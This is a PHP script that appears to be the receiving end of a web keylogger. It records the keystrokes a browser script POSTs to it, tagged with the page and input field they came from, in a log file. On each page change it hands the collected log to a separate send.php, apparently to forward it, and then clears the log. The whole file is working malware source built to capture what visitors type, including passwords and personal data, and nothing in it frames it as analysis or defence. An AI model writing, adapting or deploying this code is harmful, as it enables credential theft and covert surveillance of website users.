<?php
session_start();
date_default_timezone_set('America/Fortaleza');


if(!isset($_POST['key'])){  //Authenticate Input
    echo "Acess Denied!";
    exit(0);
} 

$time = date(" d/m/y - H:i:s || ", time());
$file = fopen("key.log", "a+");
$content_in_file = file_get_contents("key.log");
$countdown_to_launch = substr_count($content_in_file, "PC(1) ||");

if(!isset($_SESSION['page']) || $_SESSION['page'] != $_POST['page']){
    if($countdown_to_launch >= 1){
        require("./send.php");
        file_put_contents("key.log", "");
    }

    $_SESSION['page'] = $_POST['page'];
    fwrite($file, "

    ".$time." PC(1) ||
    [[[ PAGE : ".$_POST['page']." ]]] ");
}

if($_POST['reference_input'] != "undefined"){
    fwrite($file, " ".$_POST['reference_input']);
}

fwrite($file,$_POST['key']);
fclose($file);